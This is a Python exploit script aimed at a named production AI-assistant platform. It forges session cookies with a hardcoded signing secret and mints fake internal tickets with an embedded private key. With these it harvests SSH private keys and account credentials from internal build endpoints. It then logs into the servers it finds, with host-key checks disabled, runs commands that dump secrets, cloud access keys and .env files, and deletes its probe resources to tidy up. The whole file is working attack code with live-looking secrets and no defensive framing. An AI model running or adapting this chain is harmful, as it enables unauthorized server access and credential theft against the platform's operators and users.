# -*- coding: utf-8 -*-
# intent 29299: prod perRuntime machine identity -> self-signed center chat-claim ticket -> /internal/build/ssh-keys + credential -> ssh aro-81
import json,os,sys,base64,re,subprocess,time
HOST="assistant.lumiiai.cn"; BASE="https://"+HOST
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
AJWT="ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
ORG="org_bTLzxtBLmugV8uxx4QTyw"; USER="usr_ZxLewKrgbRYSm7rWDtQX8"
PROJ="proj_UWYqoFajbyb8wZchMjPZm"
CONV0="conv_qN27wjz3JkqK2KNs4muVa"; ASST0="asst_Y2iXproeYzgprC6YGa7ni"
ENV0="env_GGZoorBKzWbG5Jf5Pxb2Q"
DER_B64="MC4CAQAwBQYDK2VwBCIEIDBpyNy4vf5x/6pHS60sCrMBk/pcTOjxbKFwMtaXL3UG"
PUB_EXPECT="MCowBQYDK2VwAyEAuocOeOmI9SdclUkwb17OPvG+LM8NcRZIw8es5/Fscng="
WORK="/tmp/p29299"; os.makedirs(WORK,exist_ok=True)

def R(k,v):
    try: s=json.dumps(v,ensure_ascii=False)
    except Exception: s=repr(v)
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()

def curl(args,timeout=40,stdin=None):
    try:
        p=subprocess.run(["curl","--http2","-sS"]+args,input=stdin,capture_output=True,timeout=timeout+15)
        return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()

def call(path,method="GET",body=None,hdrs=None,timeout=40,maxlen=8000,cookie=None):
    args=["-m",str(timeout),"-A",UA,"-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: "+cookie]
    h={"Accept":"application/json","Referer":BASE+"/","Origin":BASE}
    if hdrs: h.update(hdrs)
    for k,v in h.items(): args+=["-H","%s: %s"%(k,v)]
    data=None
    if body is not None:
        data=json.dumps(body).encode(); args+=["-H","Content-Type: application/json","--data-binary","@-"]
    if method!="GET": args+=["-X",method]
    args+=[BASE+path]
    rc,out,err=curl(args,timeout=timeout,stdin=data)
    txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:150]}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

def _b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge_a(secret,sub,org):
    import hmac,hashlib
    now=int(time.time())
    h=_b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=_b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_%d"%now,"lgn":now},separators=(",",":")))
    sig=_b64u(hmac.new(secret.encode(),(h+"."+p).encode(),hashlib.sha256).digest())
    return "lumii_session="+h+"."+p+"."+sig

# ---- ed25519 sign via node ----
der=base64.b64decode(DER_B64)
open(WORK+"/k.der","wb").write(der)
node_sign=r'''
const fs=require('fs'),crypto=require('crypto');
const der=fs.readFileSync(process.argv[2]);
const msg=fs.readFileSync(process.argv[3]);
const k=crypto.createPrivateKey({key:der,format:'der',type:'pkcs8'});
const pub=crypto.createPublicKey(k).export({format:'der',type:'spki'});
process.stderr.write("PUB:"+pub.toString('base64')+"\n");
process.stdout.write(crypto.sign(null,msg,k).toString('base64url'));
'''
open(WORK+"/sign.js","w").write(node_sign)
def ed_sign(payload):
    open(WORK+"/msg.txt","wb").write(payload.encode())
    p=subprocess.run(["node",WORK+"/sign.js",WORK+"/k.der",WORK+"/msg.txt"],capture_output=True,timeout=25)
    return p.stdout.decode().strip(), p.stderr.decode()

def mint_ticket(agent_id, chat=None, run=None, ttl=7200, turn_id="", session_key=None, platform="dashboard", chat_id=None):
    now=int(time.time())
    claims={"kid":"46b1701a","iss":"center","aud":agent_id,"org":ORG,"iat":now,"exp":now+ttl,
            "session_key":session_key or ("dashboard:"+(chat or {}).get("conversation_id",CONV0)),
            "turn_id":turn_id,"platform":platform,"chat_id":chat_id or (chat or {}).get("conversation_id",CONV0),
            "actor_id":USER,"on_behalf_of":USER,"assistant_id":(chat or {}).get("assistant_id",ASST0),"team_id":None,"chain":[]}
    if chat is not None: claims["chat"]=chat
    if run is not None: claims["run"]=run
    payload=_b64u(json.dumps(claims,separators=(",",":"),ensure_ascii=False))
    sig,err=ed_sign(payload)
    return "v2."+payload+"."+sig, claims, err

C=forge_a(AJWT,USER,ORG)
me=call("/api/me",cookie=C); R("me",{"code":me["code"],"body":me["body"][:600]})

# ---- project ops ----
opj=call("/api/projects/%s/ops"%PROJ,cookie=C,maxlen=20000)
R("ops",{"code":opj["code"],"body":opj["body"][:9000],"len":opj["len"]})

# ---- check conv/asst exist ----
cv=call("/api/conversations/"+(CONV0 or "x"),cookie=C,maxlen=3000)
R("conv_get",{"code":cv["code"],"body":cv["body"][:600]})
ag=call("/api/assistants/"+(ASST0 or "x"),cookie=C,maxlen=3000)
R("asst_get",{"code":ag["code"],"body":ag["body"][:600]})

# ---- create runtime (visibility org; privateRuntimeRule would force actor==owner) ----
rt=call("/api/runtimes","POST",{"name":"pr29299","visibility":"org"},cookie=C,maxlen=400000)
RJ=J(rt) or {}
RTID=RJ.get("id") or ""; RID=RJ.get("agentId") or ""; script=RJ.get("script","") or ""
mm=re.search(r"AGENT_TOKEN='([^']+)'",script) or re.search(r"AGENT_TOKEN=\"?([A-Za-z0-9_\-]{20,})",script)
RTOK=mm.group(1) if mm else ""
open(WORK+"/rt.json","w").write(json.dumps({"rtid":RTID,"agent":RID,"tok":RTOK}))
R("rt_create",{"code":rt["code"],"rtid":RTID,"agentId":RID,"toklen":len(RTOK),"tokprefix":RTOK[:8],"script_len":len(script)})

tick=None
if RID and RTOK:
    ki=call("/api/runtimes/keys/current",hdrs={"Authorization":"Bearer "+RTOK,"x-agent-id":RID},maxlen=3000)
    R("keys_cur",{"code":ki["code"],"body":ki["body"][:800]})
    # ---- ticket for existing conv/asst (fallback: create new asst+conv) ----
    CONV,ASST=CONV0,ASST0
    if cv["code"]!="200" or not CONV:
        ac=call("/api/assistants","POST",{"name":"pr29299a","runtimeId":RTID},cookie=C)
        AJ=J(ac) or {}; ASST=AJ.get("id") or (AJ.get("assistant") or {}).get("id")
        R("asst_create",{"code":ac["code"],"asid":ASST,"body":ac["body"][:500]})
        cvc=call("/api/conversations","POST",{"projectId":PROJ,"assistantId":ASST,"title":"pr29299"},cookie=C)
        CJ=J(cvc) or {}; CONV=CJ.get("id") or (CJ.get("conversation") or {}).get("id")
        R("conv_create",{"code":cvc["code"],"conv":CONV,"body":cvc["body"][:400]})
    R("lane",{"conv":CONV,"asst":ASST,"proj":PROJ})
    if CONV and ASST:
        chatclaim={"project_id":PROJ,"conversation_id":CONV,"assistant_id":ASST,"repo_ids":[]}
        tick,cl,err=mint_ticket(RID,chat=chatclaim)
        R("ticket",{"len":len(tick),"claims":cl,"node_err":err[:200]})
    MH={"Authorization":"Bearer "+RTOK,"x-agent-id":RID}
    if tick:
        mh=dict(MH); mh["x-lumii-turn-proof"]=tick
        sk=call("/internal/build/ssh-keys",method="POST",body={},hdrs=mh,maxlen=20000)
        R("ssh_keys",{"code":sk["code"],"body":sk["body"][:9000],"len":sk["len"]})
        SKJ=J(sk) or {}
        keys=SKJ.get("ssh_keys") or []
        keysum=[{"id":k.get("key_id"),"name":k.get("name"),"mode":k.get("mode"),
                 "hosts":[{kk:h.get(kk) for kk in ("alias","host","port","login_user","envs","mode")} for h in (k.get("hosts") or [])]} for k in keys]
        R("ssh_keys_sum",keysum)
        # per-key private material
        creds={}
        for k in keys[:8]:
            kid=k.get("key_id")
            if not kid: continue
            cr=call("/internal/build/credential","POST",{"ssh_key_id":kid,"purpose":"ssh_agent"},hdrs=mh,maxlen=20000)
            cj=J(cr) or {}
            creds[kid]={"code":cr["code"],"ok":bool(cj.get("private_keys")),"n":len(cj.get("private_keys") or []),
                        "fps":cj.get("key_fps"),"msg":(cj.get("message") or "")[:200]}
            if cj.get("private_keys"):
                for i,pk in enumerate(cj["private_keys"]):
                    open(WORK+"/key_%s_%d"%(kid,i),"w").write(pk); os.chmod(WORK+"/key_%s_%d"%(kid,i),0o600)
        R("key_creds",creds)
        # accounts
        acc=call("/internal/build/accounts","POST",{"names":["PROD","ADMIN","UBUNTU","DEPLOY","ROOT","LUMII","SSH","LNT"]},hdrs=mh,maxlen=20000)
        R("accounts",{"code":acc["code"],"body":acc["body"][:6000],"len":acc["len"]})
        # env credential attempt
        ec=call("/internal/build/credential","POST",{"environment_id":ENV0,"purpose":"ssh_agent"},hdrs=mh,maxlen=6000)
        R("env_cred",{"code":ec["code"],"body":ec["body"][:2000]})
        # ---- SSH using harvested keys ----
        keyfiles=sorted([f for f in os.listdir(WORK) if f.startswith("key_")])
        R("keyfiles",keyfiles)
        targets=[]
        for k in keys:
            for h in (k.get("hosts") or []):
                if h.get("host") and h.get("port"):
                    targets.append({"key":k.get("key_id"),"host":h.get("host"),"port":int(h.get("port") or 22),"user":h.get("login_user") or "root","alias":h.get("alias")})
        if not targets: targets.append({"key":None,"host":"81.68.254.22","port":22,"user":"ubuntu","alias":"aro-81"})
        R("targets",targets)
        HARV="id; hostname; uname -a; set -a; . /opt/lumii-prod/.env.dev 2>/dev/null || . /opt/lumii-stage/.env.dev 2>/dev/null; echo ---ENVFILTER; env | grep -Ei 'secret|token|pass|key|dsn|database|zoofi|lumii|aws|aliyun|tencent|docker|registry|gh_|git' | head -80; echo ---GREP; env | grep -Eio 'zoofi[^ ]*|0xC56f[0-9a-fA-F]*|0xFE18[0-9a-fA-F]*|cloudflared|rathole|AKID[A-Za-z0-9]*|LTAI[A-Za-z0-9]*|AKIA[A-Za-z0-9]*' | head -40; echo ---LS; ls -la ~ ~/.ssh /opt /etc/ci /etc/docker 2>/dev/null | head -80"
        got=[]
        seen=set()
        for t in targets[:14]:
            host=t["host"]; port=t["port"]; user=t["user"]
            kf=None
            if t["key"]:
                cand=[f for f in keyfiles if f.startswith("key_%s_"%t["key"])]
                if cand: kf=os.path.join(WORK,cand[0])
            if not kf:
                continue
            sig=(host,port,user,kf)
            if sig in seen: continue
            seen.add(sig)
            cmd=["ssh","-i",kf,"-p",str(port),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no",
                 "-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=10","-o","IdentitiesOnly=yes",
                 "%s@%s"%(user,host),HARV]
            rc=-1
            try:
                p=subprocess.run(cmd,capture_output=True,timeout=45)
                out=p.stdout.decode("utf-8","replace"); err=p.stderr.decode("utf-8","replace"); rc=p.returncode
            except Exception as e:
                out=""; err=repr(e)
            rec={"host":host,"port":port,"user":user,"alias":t.get("alias"),"rc":rc,
                 "out":out[:9000],"err":err[-600:]}
            got.append(rec)
            R("ssh_%s_%s_%s"%(t.get("alias") or host,user,port), {"rc":rec["rc"],"out":rec["out"],"err":rec["err"]})
            if out.strip(): 
                # pull full .env.dev if we can
                cmd2=["ssh","-i",kf,"-p",str(port),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=10","%s@%s"%(user,host),
                      "cat /opt/lumii-prod/.env.dev 2>/dev/null | head -c 12000; echo; echo ---STAGE; cat /opt/lumii-stage/.env.dev 2>/dev/null | head -c 8000"]
                try:
                    p2=subprocess.run(cmd2,capture_output=True,timeout=45)
                    R("envdev_%s_%s"%(host,user),p2.stdout.decode("utf-8","replace")[:16000])
                except Exception as e:
                    R("envdev_err_%s"%host,repr(e)[:200])
        R("ssh_summary",[{k:v for k,v in g.items() if k!="out"} for g in got])
        # write full results locally too
        open(WORK+"/ssh_results.json","w").write(json.dumps(got,ensure_ascii=False)[:400000])
    else:
        R("ticket","NONE")
else:
    R("fatal","no runtime token")

# ---- cleanup probe resources ----
def dele(path):
    r=call(path,method="DELETE",cookie=C,maxlen=500)
    return {"path":path,"code":r["code"],"body":r["body"][:200]}
cl=[]
for p in ["/api/runtimes/"+RTID if RTID else "", "/api/runtimes/rt_QspvCLp8xtFwF4dwPqQmq",
          "/api/assistants/"+ASST0, "/api/conversations/"+CONV0]:
    if p: cl.append(dele(p))
# leftover env/account from prior probe (pr29175env / PROBE_LUMII)
try:
    opz=J(call("/api/projects/%s/ops"%PROJ,cookie=C,maxlen=200000)) or {}
    for env in (opz.get("envs") or []):
        nm=(env.get("name") or "")+" "+(env.get("key") or "")
        if "pr29175" in nm:
            eid2=env.get("id")
            for a in (env.get("accounts") or []):
                if (a.get("name") or "").upper().startswith("PROBE_LUMII"):
                    cl.append(dele("/api/projects/%s/ops/envs/%s/accounts/%s"%(PROJ,eid2,a.get("id"))))
            cl.append(dele("/api/projects/%s/ops/envs/%s"%(PROJ,eid2)))
except Exception as e:
    cl.append({"err":repr(e)[:200]})
R("cleanup",cl)
R("done",{"t":int(time.time())})
